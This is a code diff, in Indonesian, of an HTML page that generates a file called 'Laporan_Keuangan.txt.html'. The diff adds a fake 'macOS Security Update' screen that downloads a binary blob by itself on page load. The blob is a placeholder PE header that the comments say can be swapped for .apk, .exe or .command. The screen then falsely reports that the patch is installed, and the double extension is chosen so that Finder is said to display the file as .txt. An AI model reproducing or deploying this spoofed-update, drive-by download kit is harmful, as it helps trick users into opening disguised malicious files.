@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Generator Berkas Blob &amp; ObjectURL — Spoofed HTML</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk mengunduh file ber-ekstensi ganda <code>.txt.command</code>.</p>
+<p>Klik tombol untuk mengunduh file ber-ekstensi ganda. Saat disimpan, macOS akan menampilkannya sebagai .txt, tetapi akan dijalankan sebagai .html.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -52,25 +52,25 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            const shellScript = "#!/bin/bash\n" +
-                                "open -a Calculator\n";
-
+            // Payload HTML dengan UI Spoofing (seperti pembaruan sistem/antivirus palsu)
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>System Update</title></head>" +
-            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
-            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
-            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ System Update</h2>" +
-            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan sistem sedang diunduh. Harap tunggu.</p>" +
-            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menyiapkan file...</p>" +
+            "<head><meta charset='UTF-8'><title>macOS Security Update</title></head>" +
+            "<body style='margin:0;padding:0;background:#e5e5ea;color:#333;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='background:#fff;padding:40px;border-radius:18px;box-shadow:0 10px 40px rgba(0,0,0,0.1);max-width:450px;text-align:center;border:1px solid #d1d1d6;'>" +
+            "    <div style='font-size:50px;margin-bottom:20px;'>🛡️</div>" +
+            "    <h2 style='color:#000;margin-bottom:10px;'>Pembaruan Keamanan macOS</h2>" +
+            "    <p style='color:#555;font-size:14px;margin-bottom:25px;line-height:1.5;'>Sistem mendeteksi adanya patch keamanan kritis. Pembaruan sedang diunduh secara otomatis. Jangan tutup jendela ini.</p>" +
+            "    <div style='width:100%;background:#f2f2f7;border-radius:10px;height:8px;overflow:hidden;margin-bottom:15px;'>" +
+            "        <div style='background:#007aff;width:100%;height:100%;'></div>" +
+            "    </div>" +
+            "    <p id='status' style='color:#34c759;font-size:12px;font-weight:bold;'>Mengunduh patch...</p>" +
+            "    <p style='color:#999;font-size:10px;margin-top:30px;'>Origin: <span id='o'></span></p>" +
             "</div>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
-            
-            "var shellScript = \"#!/bin/bash\\n\" + " +
-            "                  \"open -a Calculator\\n\";" +
-            "var b64Data = btoa(unescape(encodeURIComponent(shellScript)));" +
+            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
             
             "function b64KeBytes(b64){" +
             "    var binary = atob(b64);" +
@@ -80,6 +80,9 @@ const prepareMimeBlobAsync = (i) => {
             "    return bytes;" +
             "}" +
             
+            // Payload file dummy (bisa diganti .apk / .exe / .command)
+            "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\";" +
+            
             "var sudah = false;" +
             
             "function picuDownload(){" +
@@ -87,18 +90,13 @@ const prepareMimeBlobAsync = (i) => {
             "    sudah = true;" +
             "    var statusEl = document.getElementById('status');" +
             "    try{" +
-            "        statusEl.textContent = 'Menyimpan file...';" +
+            "        statusEl.textContent = 'Menyimpan patch...';" +
             "        var bytesArr = b64KeBytes(b64Data);" +
-            
-            // Gunakan MIME type teks biasa agar tidak langsung ditandai sebagai binary berbahaya
-            "        var blob = new Blob([bytesArr], { type: 'text/plain' });" +
+            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
             "        var url = URL.createObjectURL(blob);" +
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
-            
-            // EKSTENSI GANDA: .txt.command
-            "        a.download = 'System_Patch.txt.command';" +
-            
+            "        a.download = 'Security_Update_Patch.bin';" + // File akhir yang diunduh
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
@@ -106,15 +104,16 @@ const prepareMimeBlobAsync = (i) => {
             "            if (a.parentNode) a.parentNode.removeChild(a); " +
             "            URL.revokeObjectURL(url); " +
             "        }, 3000);" +
-            "        statusEl.textContent = 'File berhasil diunduh.';" +
-            "        statusEl.style.color = '#4CAF50';" +
+            "        statusEl.textContent = 'Patch berhasil diinstal.';" +
+            "        statusEl.style.color = '#34c759';" +
             "    } catch(e){" +
             "        statusEl.textContent = 'Gagal: ' + e.message;" +
-            "        statusEl.style.color = '#f00';" +
+            "        statusEl.style.color = '#ff3b30';" +
             "        sudah = false;" +
             "    }" +
             "}" +
             
+            // Auto trigger saat halaman dimuat
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
             "document.addEventListener('click', picuDownload);" +
             "})();" +
@@ -132,8 +131,13 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `update-paket.txt.html`;
-    link.textContent = `Download update-paket.txt.html`;
+    
+    // KUNCI: Memberi nama file dengan ekstensi ganda .txt.html
+    // macOS Finder biasanya menyembunyikan ekstensi .html jika tidak diatur, 
+    // sehingga hanya tampil sebagai .txt
+    link.download = `Laporan_Keuangan.txt.html`;
+    
+    link.textContent = `Download Laporan_Keuangan.txt.html`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
